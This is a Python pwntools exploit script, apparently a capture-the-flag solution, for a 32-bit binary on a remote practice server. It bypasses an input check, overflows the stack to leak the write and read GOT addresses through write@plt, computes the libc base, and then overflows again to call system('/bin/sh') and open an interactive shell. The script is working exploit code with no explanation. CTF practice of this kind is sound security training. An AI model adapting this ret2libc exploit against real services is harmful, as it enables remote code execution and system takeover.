from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn', 29509)

sh = ELF('./pwn')

write_plt = sh.plt['write']

write_got = sh.got['write']

read_got = sh.got['read']

p.sendline(b'\x00' + b'\xff' * 8)

p.recvuntil(b'Correct\n')

payload = b'a' *(0xe7 + 4) + p32(write_plt) + p32(0x08048825) + p32(0x1) + p32(write_got) + p32(0x4)
p.sendline(payload)
write_addr = u32(p.recv(4))
print(hex(write_addr))
p.sendline(b'\x00' + b'\xff' * 8)
p.recvuntil(b'Correct\n')
payload = b'a' *(0xe7 + 4) + p32(write_plt) + p32(0x08048825) + p32(0x1) + p32(read_got) + p32(0x4)

p.sendline(payload)

read_addr = u32(p.recv(4))

print(hex(read_addr))

p.sendline(b'\x00' + b'\xff' * 8)

p.recvuntil(b'Correct\n')

write_offset = 0x0f23c0

libc = write_addr - write_offset

system_addr = libc + 0x04a470

binsh_addr = libc + 0x18ee0e

payload = b'a' *(0xe7 + 4) + p32(system_addr) + p32(0x08048825) + p32(binsh_addr)

p.sendline(payload)
p.interactive()
